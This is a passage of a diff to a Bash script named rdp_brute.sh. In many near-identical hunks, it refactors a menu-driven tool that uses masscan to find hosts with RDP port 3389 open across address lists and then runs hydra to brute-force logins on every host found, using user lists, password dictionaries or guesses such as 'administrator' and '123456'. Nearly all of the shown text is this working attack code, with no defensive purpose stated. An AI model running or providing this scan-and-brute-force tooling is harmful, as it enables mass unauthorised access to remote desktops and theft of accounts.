-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -26937,6 +10771,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -26946,53 +10781,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -27010,6 +10799,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -27019,53 +10809,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -27083,6 +10827,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -27092,53 +10837,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -27156,6 +10855,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -27165,53 +10865,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -27229,6 +10883,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -27238,53 +10893,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -27302,6 +10911,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -27311,53 +10921,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -27375,6 +10939,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -27384,53 +10949,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -27448,6 +10967,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -27457,53 +10977,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -27521,6 +10995,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -27530,53 +11005,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -27594,6 +11023,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -27603,53 +11033,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -27667,6 +11051,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -27676,53 +11061,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -27740,6 +11079,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -27749,53 +11089,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -27813,6 +11107,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -27822,53 +11117,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -27886,6 +11135,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -27895,53 +11145,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -27959,6 +11163,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -27968,53 +11173,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
